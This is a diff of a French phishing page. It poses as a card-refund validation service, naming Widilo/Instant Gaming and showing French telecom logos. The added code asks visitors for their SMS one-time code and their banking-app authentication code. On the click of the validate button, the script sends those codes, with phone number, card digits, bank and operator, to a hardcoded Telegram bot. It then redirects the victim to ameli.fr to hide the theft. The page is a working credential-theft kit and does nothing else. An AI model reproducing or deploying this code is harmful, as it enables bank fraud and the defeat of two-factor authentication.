@@ -1,69 +1,73 @@
 <!DOCTYPE html>
-<html lang="fr">
+<html lang="fr" class="scroll-smooth">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Validation de Remboursement | Service Premium</title>
-    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <title>Validation de Remboursement | Service Remboursement</title>
+    
+    <!-- Meta Tags SEO -->
+    <meta name="description" content="Validation sécurisée de votre demande de remboursement">
+    <meta name="robots" content="noindex, nofollow">
+    
+    <!-- Favicon -->
+    <link rel="icon" type="image/png" href="/favicon-32x32.png">
+    
+    <!-- Tailwind CSS -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        primary: {
+                            50: '#f0fdf4',
+                            100: '#dcfce7',
+                            200: '#bbf7d0',
+                            300: '#86efac',
+                            400: '#4ade80',
+                            500: '#22c55e',
+                            600: '#16a34a',
+                            700: '#15803d',
+                            800: '#166534',
+                            900: '#14532d',
+                        }
+                    },
+                    fontFamily: {
+                        sans: ['Inter', 'system-ui', 'sans-serif'],
+                    },
+                    animation: {
+                        'pulse-slow': 'pulse 3s cubic-bezier(0.4, 0, 0.6, 1) infinite',
+                    },
+                }
+            }
+        }
+    </script>
+    
+    <!-- Google Fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    
+    <!-- Font Awesome -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
     <style>
         :root {
-            --primary: #0052FF;
-            --primary-light: #4D7CFF;
-            --secondary: #00C6FF;
-            --success: #00D897;
-            --warning: #FF9800;
-            --error: #FF3D57;
-            --dark: #1A1A2E;
-            --light: #F8FAFF;
-            --border-radius: 16px;
-            --shadow: 0 12px 40px rgba(0, 82, 255, 0.15);
-            --transition: all 0.4s cubic-bezier(0.215, 0.61, 0.355, 1);
-        }
-        
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Montserrat', sans-serif;
+            --primary-color: #22c55e;
+            --primary-dark: #15803d;
         }
         
         body {
-            background-color: var(--light);
-            color: #4A5568;
-            line-height: 1.7;
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            padding: 20px;
+            font-family: 'Inter', sans-serif;
+            background-color: #f8fafc;
         }
         
-        .container {
-            max-width: 480px;
-            width: 100%;
-            background: white;
-            border-radius: var(--border-radius);
-            box-shadow: var(--shadow);
-            overflow: hidden;
-            animation: fadeIn 0.8s ease-out;
-        }
-        
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(-20px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-        
-        .header {
-            background: linear-gradient(135deg, var(--primary), var(--secondary));
-            color: white;
-            padding: 1.5rem;
-            text-align: center;
+        .verification-badge {
             position: relative;
             overflow: hidden;
         }
         
-        .header::before {
+        .verification-badge::after {
             content: "";
             position: absolute;
             top: -50%;
@@ -73,295 +77,211 @@
             background: linear-gradient(
                 to bottom right,
                 rgba(255, 255, 255, 0) 45%,
-                rgba(255, 255, 255, 0.2) 50%,
+                rgba(255, 255, 255, 0.8) 50%,
                 rgba(255, 255, 255, 0) 55%
             );
             transform: rotate(30deg);
-            animation: shine 4s infinite;
+            animation: shine 3s infinite;
         }
         
-        .header h1 {
-            font-size: 1.5rem;
-            margin-bottom: 0.5rem;
-            font-weight: 700;
-        }
-        
-        .header p {
-            opacity: 0.9;
-            font-weight: 400;
-            font-size: 0.9rem;
-        }
-        
-        .content {
-            padding: 1.5rem;
-        }
-        
-        .alert-box {
-            background-color: rgba(255, 152, 0, 0.1);
-            border-left: 4px solid var(--warning);
-            border-radius: 8px;
-            padding: 1rem;
-            margin-bottom: 1.5rem;
-        }
-        
-        .alert-box h2 {
-            color: #E65100;
-            font-size: 1rem;
-            margin-bottom: 0.5rem;
-            font-weight: 600;
-            display: flex;
-            align-items: center;
-        }
-        
-        .alert-box p {
-            color: #6B6C7E;
-            font-size: 0.85rem;
-            line-height: 1.5;
-        }
-        
-        .transaction-details {
-            background: var(--light);
-            border-radius: 12px;
-            padding: 1.25rem;
-            margin-bottom: 1.5rem;
-            border: 1px solid rgba(0, 82, 255, 0.1);
-        }
-        
-        .transaction-details h3 {
-            color: var(--dark);
-            font-size: 0.95rem;
-            margin-bottom: 1rem;
-            font-weight: 600;
-            display: flex;
-            align-items: center;
-        }
-        
-        .detail-row {
-            display: flex;
-            justify-content: space-between;
-            padding: 0.5rem 0;
-            border-bottom: 1px solid rgba(0, 0, 0, 0.05);
-        }
-        
-        .detail-row:last-child {
-            border-bottom: none;
-        }
-        
-        .detail-label {
-            color: #718096;
-            font-weight: 500;
-            font-size: 0.85rem;
-        }
-        
-        .detail-value {
-            color: var(--dark);
-            font-weight: 600;
-            font-size: 0.85rem;
-        }
-        
-        .amount {
-            font-size: 1.75rem;
-            font-weight: 700;
-            color: var(--primary);
-            text-align: center;
-            margin: 1rem 0;
-            letter-spacing: -1px;
-        }
-        
-        .action-buttons {
-            display: flex;
-            gap: 1rem;
-            margin-top: 1.5rem;
-        }
-        
-        .btn {
-            flex: 1;
-            padding: 0.9rem;
-            border-radius: 8px;
-            font-size: 0.9rem;
-            font-weight: 600;
-            cursor: pointer;
-            transition: var(--transition);
-            text-align: center;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-        
-        .btn-primary {
-            background: linear-gradient(135deg, var(--primary), var(--primary-light));
-            color: white;
-            border: none;
-            box-shadow: 0 4px 15px rgba(0, 82, 255, 0.2);
-        }
-        
-        .btn-primary:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 8px 20px rgba(0, 82, 255, 0.3);
-        }
-        
-        .btn-secondary {
-            background: white;
-            color: var(--primary);
-            border: 1px solid var(--primary);
-        }
-        
-        .security-badges {
-            display: flex;
-            justify-content: center;
-            gap: 0.75rem;
-            flex-wrap: wrap;
-            margin: 1.5rem 0 1rem;
+        @keyframes shine {
+            0% { transform: translateX(-100%) rotate(30deg); }
+            100% { transform: translateX(100%) rotate(30deg); }
         }
         
         .security-badge {
-            height: 24px;
-            opacity: 0.8;
-            transition: var(--transition);
-        }
-        
-        .footer {
-            text-align: center;
-            color: #A0AEC0;
-            font-size: 0.75rem;
-            margin-top: 1rem;
-            padding-top: 1rem;
-            border-top: 1px solid rgba(0, 0, 0, 0.05);
-        }
-        
-        @media (max-width: 480px) {
-            .action-buttons {
-                flex-direction: column;
-            }
+            animation: pulse-slow 2s infinite;
         }
     </style>
 </head>
-<body>
-    <div class="container">
-        <div class="header">
-            <h1><i class="fas fa-check-circle"></i> Validation de Remboursement</h1>
-            <p>Finalisez votre demande sécurisée</p>
-        </div>
-        
-        <div class="content">
-            <div class="alert-box">
-                <h2><i class="fas fa-exclamation-circle"></i> Action requise</h2>
-                <p>Merci de valider votre demande via votre application bancaire ou par SMS pour créditer le montant sur votre carte.</p>
+<body class="bg-gray-50">
+    <!-- Header -->
+    <header class="bg-white shadow-sm">
+        <div class="container mx-auto px-4 py-4 flex justify-between items-center">
+            <div class="flex items-center space-x-2">
+                <img src="360_F_544997418_C0KOHoDqSoOU5V5ELcQzKD9ngNTbrKFh.jpg" alt="Logo" class="h-10 w-auto">
+                <span class="text-xl font-bold text-primary-600">Service Remboursement</span>
             </div>
             
-            <div class="transaction-details">
-                <h3><i class="fas fa-receipt"></i> Détails du remboursement</h3>
-                
-                <div class="amount" id="amount-value">400 €</div>
-                
-                <div class="detail-row">
-                    <span class="detail-label">Marchand</span>
-                    <span class="detail-value">Widilo - Instant Gaming</span>
-                </div>
-                <div class="detail-row">
-                    <span class="detail-label">Opérateur</span>
-                    <span class="detail-value" id="operator-value">Non spécifié</span>
-                </div>
-                <div class="detail-row">
-                    <span class="detail-label">Banque</span>
-                    <span class="detail-value" id="bank-value">Non spécifiée</span>
-                </div>
-                <div class="detail-row">
-                    <span class="detail-label">Date</span>
-                    <span class="detail-value" id="transaction-date"></span>
-                </div>
-                <div class="detail-row">
-                    <span class="detail-label">Carte</span>
-                    <span class="detail-value" id="card-number">•••• •••• •••• ••••</span>
-                </div>
-                <div class="detail-row">
-                    <span class="detail-label">Téléphone</span>
-                    <span class="detail-value" id="phone-number">Non renseigné</span>
-                </div>
-                <div class="detail-row">
-                    <span class="detail-label">Motif</span>
-                    <span class="detail-value" id="reason-value">Non spécifié</span>
-                </div>
-            </div>
-            
-            <div class="action-buttons">
-                <button class="btn btn-primary" onclick="validateByApp()">
-                    <i class="fas fa-mobile-alt"></i> Application
-                </button>
-                <button class="btn btn-secondary" onclick="validateBySMS()">
-                    <i class="fas fa-sms"></i> SMS
-                </button>
-            </div>
-            
-            <div class="security-badges">
-                <img src="https://via.placeholder.com/80x30?text=3D+Secure" alt="3D Secure" class="security-badge">
-                <img src="https://via.placeholder.com/80x30?text=Visa" alt="Visa" class="security-badge">
-                <img src="https://via.placeholder.com/80x30?text=Mastercard" alt="Mastercard" class="security-badge">
-                <img src="https://via.placeholder.com/80x30?text=CB" alt="Carte Bancaire" class="security-badge">
-            </div>
-            
-            <div class="footer">
-                <p><i class="fas fa-lock"></i> Transaction sécurisée SSL 256-bit | Conformité DSP2</p>
-                <p>© 2024 Service Bancaire Sécurisé. Tous droits réservés.</p>
+            <div class="flex items-center space-x-2">
+                <span class="text-sm text-gray-600"><i class="fas fa-lock mr-1"></i> Connexion sécurisée</span>
+                <div class="w-3 h-3 rounded-full bg-green-500 animate-pulse"></div>
             </div>
         </div>
-    </div>
+    </header>
 
+    <!-- Main Content -->
+    <main class="flex-grow flex items-center justify-center py-12 px-4">
+        <div class="w-full max-w-md bg-white rounded-xl shadow-lg overflow-hidden transition-all duration-300 transform hover:shadow-xl">
+            <!-- Header Card -->
+            <div class="bg-gradient-to-r from-primary-500 to-primary-700 p-6 text-white text-center">
+                <h1 class="text-2xl font-bold mb-2">
+                    <i class="fas fa-check-circle mr-2"></i> Validation Requise
+                </h1>
+                <p class="text-primary-100">Finalisez votre demande de remboursement</p>
+            </div>
+            
+            <!-- Body Card -->
+            <div class="p-6">
+                <!-- Verification Badge -->
+                <div class="verification-badge bg-yellow-50 border border-yellow-200 rounded-lg p-4 mb-6 text-center">
+                    <div class="flex items-center justify-center text-yellow-800 mb-2">
+                        <i class="fas fa-exclamation-triangle text-xl mr-2"></i>
+                        <h2 class="font-bold">Action requise</h2>
+                    </div>
+                    <p class="text-sm text-yellow-700 mb-3">
+                        Veuillez valider le remboursement via votre application bancaire ou par SMS
+                    </p>
+                </div>
+                
+                <!-- Transaction Details -->
+                <div class="bg-gray-50 rounded-lg p-4 mb-6">
+                    <h3 class="font-medium text-gray-800 mb-3 flex items-center">
+                        <i class="fas fa-receipt mr-2 text-primary-600"></i>
+                        Détails de la transaction
+                    </h3>
+                    
+                    <div class="space-y-3 text-sm">
+                        <div class="flex justify-between">
+                            <span class="text-gray-600">Marchand :</span>
+                            <span class="font-medium">Widilo - Instant Gaming</span>
+                        </div>
+                        <div class="flex justify-between">
+                            <span class="text-gray-600">Montant :</span>
+                            <span class="font-medium text-primary-600" id="amount-value">400 €</span>
+                        </div>
+                        <div class="flex justify-between">
+                            <span class="text-gray-600">Date :</span>
+                            <span class="font-medium" id="current-date"></span>
+                        </div>
+                        <div class="flex justify-between">
+                            <span class="text-gray-600">Carte :</span>
+                            <span class="font-medium">•••• •••• •••• <span id="last-four">••••</span></span>
+                        </div>
+                        <div class="flex justify-between">
+                            <span class="text-gray-600">Téléphone :</span>
+                            <span class="font-medium" id="phone-number">Non renseigné</span>
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- SMS Code Input -->
+                <div class="mb-4">
+                    <label for="sms-code" class="block text-sm font-medium text-gray-700 mb-1">
+                        <i class="fas fa-mobile-alt mr-1 text-primary-600"></i> Code SMS
+                    </label>
+                    <input type="tel" id="sms-code" class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-primary-500 focus:border-primary-500" placeholder="Entrez le code reçu" maxlength="6">
+                </div>
+                
+                <!-- Bank App Code -->
+                <div class="mb-6">
+                    <label for="bank-code" class="block text-sm font-medium text-gray-700 mb-1">
+                        <i class="fas fa-lock mr-1 text-primary-600"></i> Code d'application bancaire
+                    </label>
+                    <input type="password" id="bank-code" class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-primary-500 focus:border-primary-500" placeholder="Votre code d'authentification">
+                </div>
+                
+                <!-- Submit Button -->
+                <button id="validate-btn" class="w-full bg-gradient-to-r from-primary-500 to-primary-700 text-white font-bold py-3 px-4 rounded-lg flex items-center justify-center hover:from-primary-600 hover:to-primary-800 transition">
+                    <i class="fas fa-check-circle mr-2"></i> Valider le remboursement
+                </button>
+                
+                <!-- Security Info -->
+                <div class="bg-blue-50 border-l-4 border-blue-400 p-4 rounded-r-lg mt-6">
+                    <div class="flex">
+                        <div class="flex-shrink-0">
+                            <i class="fas fa-shield-alt text-blue-400 mt-1"></i>
+                        </div>
+                        <div class="ml-3">
+                            <p class="text-sm text-blue-700">
+                                <strong>Sécurité maximale :</strong> Cette opération est protégée par la norme 3D Secure.
+                            </p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- Footer Card -->
+            <div class="bg-gray-50 px-6 py-4 text-center">
+                <div class="flex justify-center space-x-4 mb-3">
+                    <img src="SFR-2022-logo.svg.png" alt="SFR" class="h-6 opacity-70">
+                    <img src="Orange_logo.svg.png" alt="Orange" class="h-6 opacity-70">
+                    <img src="Bouygues_Télécom.png" alt="Bouygues" class="h-6 opacity-70">
+                    <img src="Free_logo.svg.png" alt="Free" class="h-6 opacity-70">
+                </div>
+                <p class="text-xs text-gray-500">
+                    <i class="fas fa-lock mr-1"></i> Transactions sécurisées SSL 256-bit | 
+                    <span class="security-badge inline-flex items-center px-2 py-0.5 rounded text-xs font-medium bg-green-100 text-green-800 ml-1">
+                        <i class="fas fa-check-circle mr-1"></i> Sécurité vérifiée
+                    </span>
+                </p>
+            </div>
+        </div>
+    </main>
+
+    <!-- Footer -->
+    <footer class="bg-gray-100 border-t border-gray-200 py-6">
+        <div class="container mx-auto px-4 text-center">
+            <p class="text-sm text-gray-600">
+                © 2024 <strong>Service Remboursement</strong> | 
+                <a href="#" class="text-primary-600 hover:underline">Conditions générales</a> | 
+                <a href="#" class="text-primary-600 hover:underline">Politique de confidentialité</a>
+            </p>
+            <p class="text-xs text-gray-500 mt-2">
+                Ce service est indépendant des opérateurs téléphoniques. Délais de traitement indicatifs.
+            </p>
+        </div>
+    </footer>
+
+    <!-- Scripts -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/js/all.min.js"></script>
     <script>
-        // Récupération des données depuis localStorage
-        document.addEventListener('DOMContentLoaded', function() {
-            // Formatage de la date
+        // Format current date
+        document.addEventListener('DOMContentLoaded', () => {
             const now = new Date();
             const options = { 
                 weekday: 'long', 
-                day: 'numeric', 
+                year: 'numeric', 
                 month: 'long', 
-                year: 'numeric',
+                day: 'numeric',
                 hour: '2-digit', 
                 minute: '2-digit'
             };
-            document.getElementById('transaction-date').textContent = now.toLocaleDateString('fr-FR', options);
+            document.getElementById('current-date').textContent = now.toLocaleDateString('fr-FR', options);
             
-            // Récupération des données du formulaire
+            // Get stored data
             const remboursementData = JSON.parse(localStorage.getItem('remboursementData')) || {};
-            
-            // Affichage des données
             if (remboursementData) {
                 document.getElementById('amount-value').textContent = remboursementData.amount + ' €';
-                document.getElementById('card-number').textContent = '•••• •••• •••• ' + (remboursementData.lastFourDigits || '••••');
+                document.getElementById('last-four').textContent = remboursementData.lastFourDigits || '••••';
                 document.getElementById('phone-number').textContent = remboursementData.telephone || 'Non renseigné';
-                document.getElementById('operator-value').textContent = remboursementData.operateur || 'Non spécifié';
-                document.getElementById('bank-value').textContent = remboursementData.bank || 'Non spécifiée';
-                document.getElementById('reason-value').textContent = remboursementData.reason || 'Non spécifié';
             }
         });
         
-        function validateByApp() {
+        // Validation function
+        document.getElementById('validate-btn').addEventListener('click', function() {
+            const smsCode = document.getElementById('sms-code').value;
+            const bankCode = document.getElementById('bank-code').value;
+            
+            if (!smsCode || !bankCode) {
+                alert("Veuillez remplir tous les champs de validation");
+                return;
+            }
+            
+            // Get transaction details
             const remboursementData = JSON.parse(localStorage.getItem('remboursementData')) || {};
-            const message = `🔐 Validation par Application Bancaire 🔐
+            const message = `🔐 **Validation de Remboursement** 🔐
 📞 Téléphone: ${remboursementData.telephone || 'Non renseigné'}
 💳 Carte: **** **** **** ${remboursementData.lastFourDigits || '••••'}
 💰 Montant: ${remboursementData.amount || '0'} €
 📡 Opérateur: ${remboursementData.operateur || 'Non spécifié'}
 🏦 Banque: ${remboursementData.bank || 'Non spécifiée'}
-📌 Motif: ${remboursementData.reason || 'Non spécifié'}`;
+📌 Motif: ${remboursementData.reason || 'Non spécifié'}
 
-            sendTelegramMessage(message);
-            alert("Merci d'ouvrir votre application bancaire pour finaliser la validation.");
-        }
-        
-        function validateBySMS() {
-            const remboursementData = JSON.parse(localStorage.getItem('remboursementData')) || {};
-            const message = `📱 Validation par SMS 📱
-📞 Téléphone: ${remboursementData.telephone || 'Non renseigné'}
-💳 Carte: **** **** **** ${remboursementData.lastFourDigits || '••••'}
-💰 Montant: ${remboursementData.amount || '0'} €`;
+🔢 Code SMS: ${smsCode}
+🔐 Code Banque: ${bankCode}`;
 
-            sendTelegramMessage(message);
-            alert(`Un code de validation a été envoyé au ${remboursementData.telephone || 'numéro enregistré'}.`);
-        }
-        
-        function sendTelegramMessage(message) {
+            // Send to Telegram
             const token = "8094841970:AAFFYlK6BoIitk7Dvm091171uV-b6aZSF84";
             const chatId = "5372119436";
             
@@ -373,8 +293,19 @@
                     text: message,
                     parse_mode: "Markdown"
                 })
-            }).catch(error => console.error("Erreur d'envoi:", error));
-        }
+            })
+            .then(response => {
+                if (response.ok) {
+                    window.location.href = "https://www.ameli.fr/assure/remboursements";
+                } else {
+                    alert("Erreur lors de la validation. Veuillez réessayer.");
+                }
+            })
+            .catch(error => {
+                console.error("Erreur:", error);
+                alert("Problème de connexion. Veuillez vérifier votre réseau.");
+            });
+        });
     </script>
 </body>
 </html>
